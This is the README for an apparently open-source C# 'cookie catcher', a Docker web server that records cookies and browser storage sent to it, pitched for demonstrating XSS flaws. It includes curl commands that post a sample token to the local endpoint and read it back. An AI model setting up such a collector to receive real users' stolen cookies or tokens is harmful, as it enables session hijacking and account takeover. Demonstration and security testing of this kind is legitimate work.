[![Twitter Follow](https://img.shields.io/twitter/follow/code_emitter.svg?style=social&label=Follow)](https://twitter.com/code_emitter)

# CATCHER - C# Cookie Catcher Sample Code

Spin up a quick web server to demo, for example, potential XSS
vulnerabilities by logging cookie content, local or session storage
data, etc.  Runs completely in memory and stores data for
the life of the docker container.  Simple, easy to use, with
quick spin up and tear down.

### Installation and Usage

#### Dependencies

1. [Docker](https://docs.docker.com/install/)
1. [Docker-Compose](https://docs.docker.com/compose/install/)
1. Some way to make an http request from your target that is compatible with the type of exploit. 

###### Start the server in detached mode:
```shell
docker-compose up -d
```

###### Post a payload to the server:
```shell
curl -d "'jwt:6ba8c0s0394xodeh'" -H "Content-Type: application/json" -X POST http://localhost:5000/api/v1/catch/mem/simplelist -w "/n"
```

###### Retrieve all values you've posted:
***Notice that only unique values are stored
```shell
curl http://localhost:5000/api/v1/catch/mem/simplelist -w "\n"
```

###### Rest the memory and start over if you like:
```shell
curl -H "Content-Type: application/json" -X DELETE http://localhost:5000/api/v1/catch/mem/simplelist -w "\n"
```

###### Stop the running container:
```shell
docker-compose down
```
